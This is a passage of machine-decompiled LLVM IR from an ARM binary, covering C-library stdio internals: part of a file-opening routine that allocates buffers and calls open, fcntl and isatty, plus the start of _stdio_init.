  store i1 %v2_db90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_db90, label %dec_label_pc_ddf8, label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db8c
  store i32 %v0_db8c, i32* %r0.global-to-local, align 4
  %v2_db9c = call i32 @free(i32 %v0_db8c)
  store i32 %v2_db9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ddf8

dec_label_pc_dba4:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_dba8

dec_label_pc_dba8:                                ; preds = %bb, %bb30, %dec_label_pc_dba4
  %v1_dbc0 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_dba4 ]
  %v1_dba8 = add i32 %v0_db44, 1
  %v2_dba8 = inttoptr i32 %v1_dba8 to i8*
  %v3_dba8 = load i8, i8* %v2_dba8, align 1
  %v7_dbac = icmp eq i8 %v3_dba8, 98
  store i1 %v7_dbac, i1* %cpsr_z.global-to-local, align 1
  %v1_dba8.v0_db44 = select i1 %v7_dbac, i32 %v1_dba8, i32 %v0_db44
  store i32 %v1_dba8.v0_db44, i32* %r3.global-to-local, align 4
  %v1_dbb8 = add i32 %v1_dba8.v0_db44, 1
  %v2_dbb8 = inttoptr i32 %v1_dbb8 to i8*
  %v3_dbb8 = load i8, i8* %v2_dbb8, align 1
  %v4_dbb8 = zext i8 %v3_dbb8 to i32
  store i32 %v4_dbb8, i32* %r3.global-to-local, align 4
  %v7_dbbc = icmp eq i8 %v3_dbb8, 43
  store i1 %v7_dbbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_dbbc, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_dba8
  store i32 %v1_dbc0, i32* %r3.global-to-local, align 4
  %v2_dbc4 = add nuw nsw i32 %v1_dbc0, 1
  store i32 %v2_dbc4, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_dba8, %bb33
  %v2_dbc8 = icmp eq i32 %v0_db54, 0
  store i1 %v2_dbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dbc8, label %dec_label_pc_dbd0, label %dec_label_pc_dbfc

dec_label_pc_dbd0:                                ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_dbd4 = call i32 @malloc(i32 80)
  store i32 %v1_dbd4, i32* %r0.global-to-local, align 4
  store i32 %v1_dbd4, i32* @r8, align 4
  %v3_dbd8 = icmp eq i32 %v1_dbd4, 0
  store i1 %v3_dbd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_dbd8, label %dec_label_pc_ddfc, label %dec_label_pc_dbe0

dec_label_pc_dbe0:                                ; preds = %dec_label_pc_dbd0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_dbe8 = add i32 %v1_dbd4, 1
  %v4_dbe8 = inttoptr i32 %v3_dbe8 to i8*
  store i8 32, i8* %v4_dbe8, align 1
  %v0_dbec = load i32, i32* %r2.global-to-local, align 4
  %v1_dbec = load i32, i32* @r8, align 4
  %v2_dbec = add i32 %v1_dbec, 8
  %v3_dbec = inttoptr i32 %v2_dbec to i32*
  store i32 %v0_dbec, i32* %v3_dbec, align 4
  %v0_dbf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_dbf0 = trunc i32 %v0_dbf0 to i8
  %v2_dbf0 = load i32, i32* @r8, align 4
  %v3_dbf0 = inttoptr i32 %v2_dbf0 to i8*
  store i8 %v1_dbf0, i8* %v3_dbf0, align 1
  %v0_dbf4 = load i32, i32* @r8, align 4
  %v1_dbf4 = add i32 %v0_dbf4, 56
  store i32 %v1_dbf4, i32* @r0, align 4
  %v0_dbf8 = call i32 @__stdio_init_mutex()
  store i32 %v0_dbf8, i32* %r0.global-to-local, align 4
  %v0_dbfc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dbfc

dec_label_pc_dbfc:                                ; preds = %.thread4, %dec_label_pc_dbe0
  %v0_dc54 = phi i32 [ %v0_db58, %.thread4 ], [ %v0_dbfc.pre, %dec_label_pc_dbe0 ]
  %v1_dbfc = icmp slt i32 %v0_dc54, 0
  %v2_dbfc = icmp eq i32 %v0_dc54, 0
  store i1 %v2_dbfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_dbfc, label %dec_label_pc_dc54, label %dec_label_pc_dc04

dec_label_pc_dc04:                                ; preds = %dec_label_pc_dbfc
  %v0_dc08 = load i32, i32* @r4, align 4
  %v2_dc08 = and i32 %v0_dc08, 131075
  %v1_dc0c = add nuw nsw i32 %v2_dc08, 1
  store i32 %v1_dc0c, i32* %r2.global-to-local, align 4
  %v0_dc10 = load i32, i32* @r6, align 4
  %v1_dc10 = add i32 %v0_dc10, 1
  %v2_dc14 = and i32 %v1_dc10, %v1_dc0c
  store i32 %v2_dc14, i32* %r3.global-to-local, align 4
  %v9_dc18 = icmp eq i32 %v2_dc14, %v1_dc0c
  store i1 %v9_dc18, i1* %cpsr_z.global-to-local, align 1
  %v1_dc1c = load i32, i32* @r8, align 4
  %v2_dc1c = add i32 %v1_dc1c, 4
  %v3_dc1c = inttoptr i32 %v2_dc1c to i32*
  store i32 %v0_dc54, i32* %v3_dc1c, align 4
  br i1 %v9_dc18, label %dec_label_pc_dc24, label %dec_label_pc_db78

dec_label_pc_dc24:                                ; preds = %dec_label_pc_dc04
  %v0_dc24 = load i32, i32* @r4, align 4
  %v1_dc24 = load i32, i32* @r6, align 4
  %v2_dc24 = sub i32 -1, %v1_dc24
  %v3_dc24 = and i32 %v0_dc24, %v2_dc24
  store i32 %v3_dc24, i32* %r3.global-to-local, align 4
  %v1_dc28 = and i32 %v3_dc24, 1024
  %v2_dc28 = icmp eq i32 %v1_dc28, 0
  store i1 %v2_dc28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dc28, label %dec_label_pc_dc48, label %dec_label_pc_dc30

dec_label_pc_dc30:                                ; preds = %dec_label_pc_dc24
  %v0_dc30 = load i32, i32* @r5, align 4
  store i32 %v0_dc30, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_dc3c = call i32 @__libc_fcntl(i32 %v0_dc30, i32 4)
  store i32 %v2_dc3c, i32* %r0.global-to-local, align 4
  %v2_dc40 = icmp eq i32 %v2_dc3c, 0
  store i1 %v2_dc40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dc40, label %dec_label_pc_dc30.dec_label_pc_dc48_crit_edge, label %dec_label_pc_db78

dec_label_pc_dc30.dec_label_pc_dc48_crit_edge:    ; preds = %dec_label_pc_dc30
  %v0_dc48.pre = load i32, i32* @r6, align 4
  %v0_dc4c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_dc48

dec_label_pc_dc48:                                ; preds = %dec_label_pc_dc30.dec_label_pc_dc48_crit_edge, %dec_label_pc_dc24
  %v0_dc4c = phi i32 [ %v0_dc4c.pre, %dec_label_pc_dc30.dec_label_pc_dc48_crit_edge ], [ %v0_dc24, %dec_label_pc_dc24 ]
  %v0_dc48 = phi i32 [ %v0_dc48.pre, %dec_label_pc_dc30.dec_label_pc_dc48_crit_edge ], [ %v1_dc24, %dec_label_pc_dc24 ]
  %v1_dc48 = and i32 %v0_dc48, 131072
  store i32 %v1_dc48, i32* %r3.global-to-local, align 4
  %v2_dc4c = or i32 %v1_dc48, %v0_dc4c
  store i32 %v2_dc4c, i32* @r4, align 4
  br label %dec_label_pc_dc78

dec_label_pc_dc54:                                ; preds = %dec_label_pc_dbfc
  %v7_dc54 = icmp eq i32 %v0_dc54, -1
  store i1 %v7_dc54, i1* %cpsr_z.global-to-local, align 1
  %v0_dc60.pre = load i32, i32* @r4, align 4
  br i1 %v7_dc54, label %dec_label_pc_dc54._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_dc54
  %v2_dc58 = or i32 %v0_dc60.pre, 131072
  store i32 %v2_dc58, i32* @r4, align 4
  br label %dec_label_pc_dc54._crit_edge

dec_label_pc_dc54._crit_edge:                     ; preds = %dec_label_pc_dc54, %bb34
  %v0_dc60 = phi i32 [ %v2_dc58, %bb34 ], [ %v0_dc60.pre, %dec_label_pc_dc54 ]
  %v0_dc5c = load i32, i32* @r6, align 4
  store i32 %v0_dc5c, i32* %r0.global-to-local, align 4
  store i32 %v0_dc60, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_dc68 = inttoptr i32 %v0_dc5c to i8*
  %v3_dc68 = call i32 @__libc_open(i8* %v2_dc68, i32 %v0_dc60)
  store i32 %v3_dc68, i32* %r0.global-to-local, align 4
  %v1_dc6c = icmp slt i32 %v3_dc68, 0
  %v2_dc6c = icmp eq i32 %v3_dc68, 0
  store i1 %v2_dc6c, i1* %cpsr_z.global-to-local, align 1
  %v1_dc70 = load i32, i32* @r8, align 4
  %v2_dc70 = add i32 %v1_dc70, 4
  %v3_dc70 = inttoptr i32 %v2_dc70 to i32*
  store i32 %v3_dc68, i32* %v3_dc70, align 4
  br i1 %v1_dc6c, label %dec_label_pc_db8c, label %dec_label_pc_dc78

dec_label_pc_dc78:                                ; preds = %dec_label_pc_dc54._crit_edge, %dec_label_pc_dc48
  %v0_dc78 = load i32, i32* @r8, align 4
  %v1_dc78 = inttoptr i32 %v0_dc78 to i32*
  %v2_dc78 = load i32, i32* %v1_dc78, align 4
  %v1_dc7c = and i32 %v2_dc78, 8192
  store i32 %v1_dc7c, i32* %r3.global-to-local, align 4
  %v3_dc801 = udiv i32 %v1_dc7c, 256
  store i32 %v3_dc801, i32* %r2.global-to-local, align 4
  %v1_dc84 = trunc i32 %v3_dc801 to i8
  %v3_dc84 = add i32 %v0_dc78, 1
  %v4_dc84 = inttoptr i32 %v3_dc84 to i8*
  store i8 %v1_dc84, i8* %v4_dc84, align 1
  %v0_dc88 = load i32, i32* %r3.global-to-local, align 4
  %v1_dc88 = trunc i32 %v0_dc88 to i8
  %v2_dc88 = load i32, i32* @r8, align 4
  %v3_dc88 = inttoptr i32 %v2_dc88 to i8*
  store i8 %v1_dc88, i8* %v3_dc88, align 1
  %v0_dc8c = load i32, i32* @r4, align 4
  %v1_dc8c = and i32 %v0_dc8c, 131072
  store i32 %v1_dc8c, i32* %r1.global-to-local, align 4
  %v2_dc8c = icmp eq i32 %v1_dc8c, 0
  store i1 %v2_dc8c, i1* %cpsr_z.global-to-local, align 1
  %v0_dc90 = load i32, i32* @r8, align 4
  %v1_dc90 = add i32 %v0_dc90, 1
  %v2_dc90 = inttoptr i32 %v1_dc90 to i8*
  %v3_dc90 = load i8, i8* %v2_dc90, align 1
  %v4_dc90 = zext i8 %v3_dc90 to i32
  %v1_dc94 = inttoptr i32 %v0_dc90 to i8*
  %v2_dc94 = load i8, i8* %v1_dc94, align 1
  %v3_dc94 = zext i8 %v2_dc94 to i32
  store i32 %v3_dc94, i32* %r3.global-to-local, align 4
  br i1 %v2_dc8c, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_dc78
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_dc78, %bb35
  %v0_dca8 = phi i32 [ 0, %dec_label_pc_dc78 ], [ 32768, %bb35 ]
  %v1_dc9c = and i32 %v0_dc8c, 1024
  store i32 %v1_dc9c, i32* %r0.global-to-local, align 4
  %v4_dca4 = mul nuw nsw i32 %v4_dc90, 256
  %v5_dca4 = or i32 %v3_dc94, %v4_dca4
  %v2_dca8 = or i32 %v0_dca8, %v1_dc9c
  store i32 %v2_dca8, i32* %r1.global-to-local, align 4
  %v2_dcb0 = or i32 %v5_dca4, %v2_dca8
  %v1_dca0 = mul i32 %v0_dc8c, 16
  %v1_dcac = and i32 %v1_dca0, 48
  %v1_dcb4 = add nuw nsw i32 %v1_dcac, 16
  %v4_dcb8 = xor i32 %v1_dcb4, 48
  %v5_dcb8 = or i32 %v2_dcb0, %v4_dcb8
  store i32 %v5_dcb8, i32* %r3.global-to-local, align 4
  %v3_dcbc19 = udiv i32 %v2_dcb0, 256
  store i32 %v3_dcbc19, i32* %r2.global-to-local, align 4
  %v1_dcc0 = trunc i32 %v3_dcbc19 to i8
  store i8 %v1_dcc0, i8* %v2_dc90, align 1
  %v0_dcc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_dcc4 = trunc i32 %v0_dcc4 to i8
  %v2_dcc4 = load i32, i32* @r8, align 4
  %v3_dcc4 = inttoptr i32 %v2_dcc4 to i8*
  store i8 %v1_dcc4, i8* %v3_dcc4, align 1
  %v0_dcc8 = call i32 @__errno_location()
  store i32 %v0_dcc8, i32* %r0.global-to-local, align 4
  %v0_dccc = load i32, i32* @r8, align 4
  %v1_dccc = add i32 %v0_dccc, 1
  %v2_dccc = inttoptr i32 %v1_dccc to i8*
  %v3_dccc = load i8, i8* %v2_dccc, align 1
  %v4_dccc = zext i8 %v3_dccc to i32
  %v1_dcd0 = inttoptr i32 %v0_dccc to i8*
  %v2_dcd0 = load i8, i8* %v1_dcd0, align 1
  %v3_dcd0 = zext i8 %v2_dcd0 to i32
  store i32 %v0_dcc8, i32* @r6, align 4
  %v1_dcd8 = add i32 %v0_dccc, 4
  %v2_dcd8 = inttoptr i32 %v1_dcd8 to i32*
  %v3_dcd8 = load i32, i32* %v2_dcd8, align 4
  store i32 %v3_dcd8, i32* %r0.global-to-local, align 4
  %v4_dcdc = mul nuw nsw i32 %v4_dccc, 256
  %v5_dcdc = or i32 %v3_dcd0, %v4_dcdc
  store i32 %v5_dcdc, i32* @r4, align 4
  %v1_dce0 = inttoptr i32 %v0_dcc8 to i32*
  %v2_dce0 = load i32, i32* %v1_dce0, align 4
  store i32 %v2_dce0, i32* @r5, align 4
  %v1_dce4 = call i32 @isatty(i32 %v3_dcd8)
  store i32 %v1_dce4, i32* %r0.global-to-local, align 4
  %v0_dce8 = load i32, i32* @r4, align 4
  %v4_dce8 = mul i32 %v1_dce4, 256
  %v5_dce8 = or i32 %v0_dce8, %v4_dce8
  store i32 %v5_dce8, i32* @r4, align 4
  %v3_dcec = sdiv i32 %v5_dce8, 256
  store i32 %v3_dcec, i32* %r3.global-to-local, align 4
  %v1_dcf0 = trunc i32 %v3_dcec to i8
  %v2_dcf0 = load i32, i32* @r8, align 4
  %v3_dcf0 = add i32 %v2_dcf0, 1
  %v4_dcf0 = inttoptr i32 %v3_dcf0 to i8*
  store i8 %v1_dcf0, i8* %v4_dcf0, align 1
  %v0_dcf4 = load i32, i32* @r4, align 4
  %v1_dcf4 = trunc i32 %v0_dcf4 to i8
  %v2_dcf4 = load i32, i32* @r8, align 4
  %v3_dcf4 = inttoptr i32 %v2_dcf4 to i8*
  store i8 %v1_dcf4, i8* %v3_dcf4, align 1
  %v0_dcf8 = load i32, i32* @r5, align 4
  %v1_dcf8 = load i32, i32* @r6, align 4
  %v2_dcf8 = inttoptr i32 %v1_dcf8 to i32*
  store i32 %v0_dcf8, i32* %v2_dcf8, align 4
  %v0_dcfc = load i32, i32* @r8, align 4
  %v1_dcfc = add i32 %v0_dcfc, 8
  %v2_dcfc = inttoptr i32 %v1_dcfc to i32*
  %v3_dcfc = load i32, i32* %v2_dcfc, align 4
  store i32 %v3_dcfc, i32* %r3.global-to-local, align 4
  %v2_dd00 = icmp eq i32 %v3_dcfc, 0
  store i1 %v2_dd00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dd00, label %dec_label_pc_dd08, label %bb37

dec_label_pc_dd08:                                ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_dd0c = call i32 @malloc(i32 4096)
  store i32 %v1_dd0c, i32* %r0.global-to-local, align 4
  %v2_dd10 = icmp eq i32 %v1_dd0c, 0
  store i1 %v2_dd10, i1* %cpsr_z.global-to-local, align 1
  %v1_dd24.pre = load i32, i32* @r8, align 4
  br i1 %v2_dd10, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_dd08
  %v2_dd2420 = add i32 %v1_dd24.pre, 8
  %v3_dd2421 = inttoptr i32 %v2_dd2420 to i32*
  store i32 0, i32* %v3_dd2421, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_dd08
  %v2_dd14 = inttoptr i32 %v1_dd24.pre to i32*
  %v3_dd14 = load i32, i32* %v2_dd14, align 4
  %v2_dd18 = or i32 %v3_dd14, 16384
  store i32 %v2_dd18, i32* %r3.global-to-local, align 4
  %v2_dd1c = add i32 %v1_dd0c, 4096
  store i32 %v2_dd1c, i32* %r2.global-to-local, align 4
  %v4_dd20 = sdiv i32 %v2_dd18, 256
  store i32 %v4_dd20, i32* %r1.global-to-local, align 4
  %v2_dd24 = add i32 %v1_dd24.pre, 8
  %v3_dd24 = inttoptr i32 %v2_dd24 to i32*
  store i32 %v1_dd0c, i32* %v3_dd24, align 4
  %v1_dd28 = load i32, i32* %r2.global-to-local, align 4
  %v2_dd28 = load i32, i32* @r8, align 4
  %v3_dd28 = add i32 %v2_dd28, 12
  %v4_dd28 = inttoptr i32 %v3_dd28 to i32*
  store i32 %v1_dd28, i32* %v4_dd28, align 4
  %v1_dd2c = load i32, i32* %r1.global-to-local, align 4
  %v2_dd2c = trunc i32 %v1_dd2c to i8
  %v3_dd2c = load i32, i32* @r8, align 4
  %v4_dd2c = add i32 %v3_dd2c, 1
  %v5_dd2c = inttoptr i32 %v4_dd2c to i8*
  store i8 %v2_dd2c, i8* %v5_dd2c, align 1
  %v0_dd30.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dd30.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_dd30 = load i32, i32* %r3.global-to-local, align 4
  %v2_dd30 = trunc i32 %v1_dd30 to i8
  %v3_dd30 = load i32, i32* @r8, align 4
  %v4_dd30 = inttoptr i32 %v3_dd30 to i8*
  store i8 %v2_dd30, i8* %v4_dd30, align 1
  %v0_dd34.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dd34.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_dd34 = load i32, i32* @r8, align 4
  %v3_dd34 = add i32 %v2_dd34, 12
  %v4_dd34 = inttoptr i32 %v3_dd34 to i32*
  store i32 %v1_dd0c, i32* %v4_dd34, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b774.285 to i32), i32* %r3.global-to-local, align 4
  %v2_dd40 = load i32, i32* @r8, align 4
  %v3_dd40 = add i32 %v2_dd40, 2
  %v4_dd40 = inttoptr i32 %v3_dd40 to i8*
  store i8 0, i8* %v4_dd40, align 1
  %v0_dd44 = load i32, i32* @r8, align 4
  %v1_dd44 = add i32 %v0_dd44, 1
  %v2_dd44 = inttoptr i32 %v1_dd44 to i8*
  %v3_dd44 = load i8, i8* %v2_dd44, align 1
  %v4_dd44 = zext i8 %v3_dd44 to i32
  store i32 %v4_dd44, i32* %r2.global-to-local, align 4
  %v2_dd48 = load i32, i32* @global_var_1b774.285, align 4
  store i32 %v2_dd48, i32* %r1.global-to-local, align 4
  %v1_dd4c = add i32 %v0_dd44, 8
  %v2_dd4c = inttoptr i32 %v1_dd4c to i32*
  %v3_dd4c = load i32, i32* %v2_dd4c, align 4
  store i32 %v3_dd4c, i32* %r3.global-to-local, align 4
  %v1_dd50 = and i32 %v4_dd44, 32
  %v2_dd50 = icmp eq i32 %v1_dd50, 0
  store i1 %v2_dd50, i1* %cpsr_z.global-to-local, align 1
  %v2_dd54 = add i32 %v0_dd44, 20
  %v3_dd54 = inttoptr i32 %v2_dd54 to i32*
  store i32 %v3_dd4c, i32* %v3_dd54, align 4
  %v0_dd58 = load i32, i32* %r0.global-to-local, align 4
  %v1_dd58 = load i32, i32* @r8, align 4
  %v2_dd58 = add i32 %v1_dd58, 44
  %v3_dd58 = inttoptr i32 %v2_dd58 to i32*
  store i32 %v0_dd58, i32* %v3_dd58, align 4
  %v0_dd5c = load i32, i32* %r1.global-to-local, align 4
  %v1_dd5c = load i32, i32* @r8, align 4
  %v2_dd5c = add i32 %v1_dd5c, 52
  %v3_dd5c = inttoptr i32 %v2_dd5c to i32*
  store i32 %v0_dd5c, i32* %v3_dd5c, align 4
  %v0_dd60 = load i32, i32* %r3.global-to-local, align 4
  %v1_dd60 = load i32, i32* @r8, align 4
  %v2_dd60 = add i32 %v1_dd60, 24
  %v3_dd60 = inttoptr i32 %v2_dd60 to i32*
  store i32 %v0_dd60, i32* %v3_dd60, align 4
  %v0_dd64 = load i32, i32* %r3.global-to-local, align 4
  %v1_dd64 = load i32, i32* @r8, align 4
  %v2_dd64 = add i32 %v1_dd64, 28
  %v3_dd64 = inttoptr i32 %v2_dd64 to i32*
  store i32 %v0_dd64, i32* %v3_dd64, align 4
  %v0_dd68 = load i32, i32* %r3.global-to-local, align 4
  %v1_dd68 = load i32, i32* @r8, align 4
  %v2_dd68 = add i32 %v1_dd68, 16
  %v3_dd68 = inttoptr i32 %v2_dd68 to i32*
  store i32 %v0_dd68, i32* %v3_dd68, align 4
  br i1 %v2_dd50, label %dec_label_pc_ddfc, label %dec_label_pc_dd70

dec_label_pc_dd70:                                ; preds = %bb37
  %v2_dd70 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_dd70, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_c0b4.90 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b75c.273 to i32), i32* %r2.global-to-local, align 4
  %v1_dd88 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1b75c.273 to i32), i32* %r0.global-to-local, align 4
  %v1_dd98 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_1b744.291 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_db4c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_c0b4.90 to i32), i32* %r1.global-to-local, align 4
  %v1_ddac = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1b744.291 to i32), i32* %r0.global-to-local, align 4
  %v1_ddb8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_1b740.295 to i32), i32* %r2.global-to-local, align 4
  %v2_ddc0 = load i32, i32* bitcast (i32** @global_var_1b740.295 to i32*), align 4
  store i32 %v2_ddc0, i32* %r3.global-to-local, align 4
  store i32 %v2_db4c, i32* @r0, align 4
  %v1_ddc8 = load i32, i32* @r8, align 4
  %v2_ddc8 = add i32 %v1_ddc8, 32
  %v3_ddc8 = inttoptr i32 %v2_ddc8 to i32*
  store i32 %v2_ddc0, i32* %v3_ddc8, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_ddd4 = load i32, i32* @r8, align 4
  %v1_ddd4 = load i32, i32* %r2.global-to-local, align 4
  %v2_ddd4 = inttoptr i32 %v1_ddd4 to i32*
  store i32 %v0_ddd4, i32* %v2_ddd4, align 4
  %v1_dddc = call i32 @__pthread_return_void()
  store i32 %v2_dd70, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 56820, i32* @lr, align 4
  %v1_ddf0 = call i32 @__pthread_return_void()
  store i32 %v1_ddf0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ddfc

dec_label_pc_ddf8:                                ; preds = %dec_label_pc_db8c, %dec_label_pc_db78, %dec_label_pc_db98
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_ddfc

dec_label_pc_ddfc:                                ; preds = %bb37, %dec_label_pc_dbd0, %dec_label_pc_dd70, %dec_label_pc_ddf8
  %v0_ddfc = load i32, i32* @r8, align 4
  store i32 %v0_ddfc, i32* %r0.global-to-local, align 4
  %v2_de04 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_de04, i32* @r4, align 4
  store i32 %v6_db40, i32* @r5, align 4
  store i32 %v9_db40, i32* @r6, align 4
  store i32 %v15_db40, i32* @r8, align 4
  ret i32 %v0_ddfc

; uselistorder directives
  uselistorder i32 %v1_dd24.pre, { 1, 0, 2 }
  uselistorder i32 %v3_dcec, { 1, 0 }
  uselistorder i32 %v3_dc801, { 1, 0 }
  uselistorder i32 %v0_dc60, { 1, 0 }
  uselistorder i1 %v7_dc54, { 1, 0 }
  uselistorder i32 %v1_dc24, { 1, 0 }
  uselistorder i32 %v0_dc24, { 1, 0 }
  uselistorder i32 %v1_dc0c, { 1, 0, 2 }
  uselistorder i32 %v1_dbc0, { 1, 0 }
  uselistorder i32 %v0_db8c, { 1, 0, 2 }
  uselistorder i1 %v7_db6c, { 1, 0 }
  uselistorder i1 %v7_db60, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 22, 23 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 9, 8, 11, 10, 13, 12, 15, 14, 16, 18, 17, 20, 19, 21 }
  uselistorder i32 4096, { 6, 2, 7, 0, 1, 3, 5, 4 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 1, 0, 2 }
  uselistorder i32 131072, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32 (i32)* @free, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 16, 15, 0, 1 }
  uselistorder label %dec_label_pc_ddfc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_ddf8, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_dc54._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_dbfc, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_dba8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_db78, { 1, 2, 0 }
}

define i32 @"$d"(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_de08:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_de08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_de08, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_de08
  %v3_de10 = and i32 %arg4, %arg3
  store i32 %v3_de10, i32* %r0.global-to-local, align 4
  %v2_de14 = trunc i32 %v3_de10 to i16
  %v4_de14 = inttoptr i32 %v3_de10 to i16*
  store i16 %v2_de14, i16* %v4_de14, align 2
  %v5_de14 = load i32, i32* @r6, align 4
  %v6_de14 = load i32, i32* %r0.global-to-local, align 4
  %v7_de14 = sub i32 %v6_de14, %v5_de14
  store i32 %v7_de14, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_de08, %bb
  %v8_de14 = phi i32 [ %tmp, %dec_label_pc_de08 ], [ %v7_de14, %bb ]
  ret i32 %v8_de14

; uselistorder directives
  uselistorder i32 %v3_de10, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_de38 = load i32, i32* @r4, align 4
  store i32 %v3_de38, i32* %stack_var_-24, align 4
  %v9_de38 = load i32, i32* @r6, align 4
  %v0_de3c = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_1b778.294 to i32), i32* @r4, align 4
  %v3_de44 = load i8, i8* @global_var_1b779.298, align 1
  %v4_de44 = zext i8 %v3_de44 to i32
  %v2_de48 = load i8, i8* bitcast (i8** @global_var_1b778.294 to i8*), align 4
  %v3_de48 = zext i8 %v2_de48 to i32
  store i32 %v0_de3c, i32* @r7, align 4
  %v4_de54 = mul nuw nsw i32 %v4_de44, 256
  %v5_de54 = or i32 %v3_de48, %v4_de54
  store i32 %v5_de54, i32* @r6, align 4
  %v1_de58 = inttoptr i32 %v0_de3c to i32*
  %v2_de58 = load i32, i32* %v1_de58, align 4
  store i32 %v2_de58, i32* %r8.global-to-local, align 4
  %v1_de5c = call i32 @isatty(i32 0)
  %v1_de60 = sub i32 1, %v1_de5c
  %v0_de64 = load i32, i32* @r6, align 4
  %v4_de64 = mul i32 %v1_de60, 256
  %v5_de64 = xor i32 %v4_de64, %v0_de64
  %v3_de68 = load i8, i8* @global_var_1b7c9.299, align 1
  %v4_de68 = zext i8 %v3_de68 to i32
  %v3_de6c = load i8, i8* @global_var_1b7c8.300, align 1
  %v4_de6c = zext i8 %v3_de6c to i32
  %v3_de70 = sdiv i32 %v5_de64, 256
  %v4_de78 = mul nuw nsw i32 %v4_de68, 256
  %v5_de78 = or i32 %v4_de6c, %v4_de78
  store i32 %v5_de78, i32* @r5, align 4
  %v1_de7c = trunc i32 %v3_de70 to i8
  store i8 %v1_de7c, i8* @global_var_1b779.298, align 1
  %v1_de80 = trunc i32 %v0_de64 to i8
  %v2_de80 = load i32, i32* @r4, align 4
  %v3_de80 = inttoptr i32 %v2_de80 to i8*
  store i8 %v1_de80, i8* %v3_de80, align 1
  %v1_de84 = call i32 @isatty(i32 1)
  %v1_de88 = sub i32 1, %v1_de84
  %v0_de8c = load i32, i32* @r5, align 4
  %v4_de8c = mul i32 %v1_de88, 256
